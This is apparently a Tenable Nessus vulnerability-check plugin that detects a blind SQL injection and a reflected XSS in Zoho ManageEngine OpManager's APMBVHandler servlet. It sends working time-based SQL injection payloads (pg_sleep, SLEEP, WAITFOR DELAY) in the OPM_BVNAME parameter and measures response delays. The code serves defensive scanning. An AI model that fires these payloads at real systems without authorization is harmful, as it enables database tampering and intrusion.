#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(81379);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/05/16 14:02:53 $");

  script_cve_id("CVE-2014-7868", "CVE-2016-82014", "CVE-2016-82015");
  script_bugtraq_id(71002);
  script_osvdb_id(114479, 137365);
  script_xref(name:"TRA", value:"TRA-2016-10");
  script_xref(name:"EDB-ID", value:"35209");
  
  script_name(english:"Zoho ManageEngine OpManager 'OPM_BVNAME' Multiple Vulnerabilities");
  script_summary(english:"Attempts to exploit the flaw.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web application that is affected by
multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of Zoho ManageEngine OpManager
that is affected by multiple vulnerabilities : 

  - A blind SQL injection vulnerability exists due to
    improper sanitization of user-supplied input to the
    'OPM_BVNAME' parameter of the APMBVHandler servlet. An
    unauthenticated, remote attacker can exploit this to
    modify the application's database and potentially gain
    administrative rights. (CVE-2014-7868 / CVE-2016-82014)

  - A reflected cross-site scripting (XSS) vulnerability
    exists due to improper validation of user-supplied input
    to the 'OPM_BVNAME' parameter of the APMBVHandler
    servlet. A context-dependent attacker can exploit this,
    via a specially crafted request, to execute arbitrary
    script code in a user's browser session.
    (CVE-2016-82015)

Note that additional SQL injection vulnerabilities exist; however,
Nessus has not tested for these.");
  # https://support.zoho.com/portal/manageengine/helpcenter/articles/sql-injection-vulnerability-fix
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?29582d4f");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2016-10");
  script_set_attribute(attribute:"solution", value:
"Zoho has released a patch for ManageEngine OpManager versions 11.3,
11.4, and 11.5; however, the patch is only a partial fix. Upgrade to
OpManager version 11.6 for the full fix.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/08/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/06/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/02/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_opmanager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("manageengine_opmanager_detect.nbin");
  script_require_keys("installed_sw/ManageEngine OpManager");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("install_func.inc");
include("http.inc");
include("url_func.inc");

appname = "ManageEngine OpManager";
# Stops get_http_port from branching
get_install_count(app_name:appname, exit_if_zero:TRUE);

port     = get_http_port(default:80);
install  = get_single_install(app_name:appname,port:port); # Can be launched against unknown version
version  = install['version'];
build    = install['build'  ];
url      = build_url(port:port,qs:install['path']);
item     = "/servlet/APMBVHandler";
postdat  = "OPERATION_TYPE=Delete&OPM_BVNAME="+rand_str(length:3)+"'%3b";
variance = 4; # Variance allowed in response time
timings  = make_list(15,20); # Seconds to sleep for test
cmds     = make_list( # To figure out what the db backend is
  "+SELECT+pg_sleep(%TIMING%)%3b--+",     # Postgres
  "+SELECT+SLEEP(%TIMING%)%3b--+",        # MySQL
  "+WAITFOR+DELAY+'00:00:%TIMING%'%3b--+" # SQL Server
);

requests  = make_list();
output    = NULL;
timing    = 10;
nopatch   = FALSE;

# Only use "ViewName" as a sign that the system
# hasn't been patched for the XSS for unknown
# versions or versions less than 11.5
chkpatch = (version == UNKNOWN_VER);
if(!chkpatch)
  chkpatch = (ver_compare(ver:version,fix:"11.5",strict:FALSE) < 0);

# Find out which db backend we're using
foreach cmd (cmds)
{
  http_set_read_timeout(timing*3+variance);
  then = unixtime();
  res  = http_send_recv3(
    method       : "POST",
    item         : item,
    add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
    data         : postdat+ereg_replace(pattern:"%TIMING%",replace:timing,string:cmd),
    port         : port,
    exit_on_fail : TRUE
  );
  now = unixtime();

  realtime = timing;
  # No patch at all, query runs 3 times, with 'patch' it runs once
  #
  # 2015/04/05 : Version 11.5 has a variation of this patch that 
  # reintroduces ViewName but protects it from being used for XSS
  if("ViewName" >< res[2] && chkpatch)
  {
    realtime = timing*3;
    nopatch = TRUE;
  }

  # Found back-end
  delta = now-then;
  if(delta >= realtime && delta < realtime+variance)
  {
    postdat += cmd;
    requests = make_list(requests,  http_last_sent_request());
    output  += res[0]+'(Response was delayed by '+delta+' seconds)\n';
    break;
  }
}

# First test failed
if(empty_or_null(requests))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, url);

# Try 2 more timings to confirm
foreach timing (timings)
{
  realtime = timing;
  if(nopatch) realtime = timing*3;

  http_set_read_timeout(realtime+variance);
  then = unixtime();
  res  = http_send_recv3(
    method       : "POST",
    item         : item,
    add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
    data         : ereg_replace(pattern:"%TIMING%",replace:timing,string:postdat),
    port         : port,
    exit_on_fail : TRUE
  );
  now = unixtime();

  # Test failed
  delta = now-then;
  if(delta < realtime || delta > realtime+variance)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, url);

  # Test passed
  requests  = make_list(requests,  http_last_sent_request());
  output   += res[0]+'(Response was delayed by '+delta+' seconds)\n';
}

rep_extra = NULL;
if(nopatch)
  rep_extra = 'Nessus determined that server is completely unpatched. Each injection' + '\n' +
              'runs three times per request and the servlet contains the reflected' + '\n' +
              'XSS flaw.';

# If we make it here all 3 tests passed
security_report_v4(
  port      : port,
  request   : requests,
  output    : chomp(output),
  rep_extra : rep_extra,
  severity  : SECURITY_HOLE,
  generic   : TRUE,
  sqli      : TRUE,
  xss       : nopatch # XSS Only present if no patch applied
);
